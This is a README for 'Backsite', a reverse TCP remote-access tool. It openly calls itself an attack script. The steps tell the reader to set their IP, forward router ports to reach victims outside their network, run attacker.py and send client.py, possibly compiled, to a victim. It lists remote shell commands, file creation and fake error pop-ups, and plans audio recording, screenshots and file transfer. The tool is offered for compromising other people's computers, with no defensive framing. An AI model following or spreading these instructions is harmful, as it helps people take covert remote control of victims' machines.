# Backsite
A reverse_tcp type attack script that can do bunch of different things.

**First it was supposed to be a part of [basic.exe](https://github.com/yogeshxd/Basic.exe)  but it deserved it's own repo.**

# Installation and running

1. First run the following command:
```python3 -m pip install -r requirements.txt```

2. Then you need to replace Nost variable with your ip in both attacker.py and client.py.

`Note : You will need to replace Host variable with your external ip and do port fordwarding on your router to attack victims outside your home network.`

3. Leave the port variable as it is if the victim is on your home network else change it to the port number you forwarded.
4. then run `attacker.py` file on your system and send `client.py` file to the victim.(You can compile the file or tweek it according to your need.)
5. And that's it. you are ready to go.

# Current Commands:
After a connection is stablished you will have access to these stuffs:

1. All default cmd commands. (I know you don't know each cmd command that's why I added [cmd.md](/cmd.md) file for you.)

```Note : Cmd file is currently not easy to read. Will fix it soon.```

2. file 

`file [File name] [Content]`

creates a file in the working directory.


3. error

`error [message]`

Shows a error msg on user screen.


4. More to come soon....

# Future updates
Future updates will include:
1. Multi client handling
2. Remote audio recording
3. Remote Screenshot
4. File upload/downlad

# Issues
**For any issues either open a issue or dm me on [Insta](https://www.instagram.com/yogesh_.xd/)**
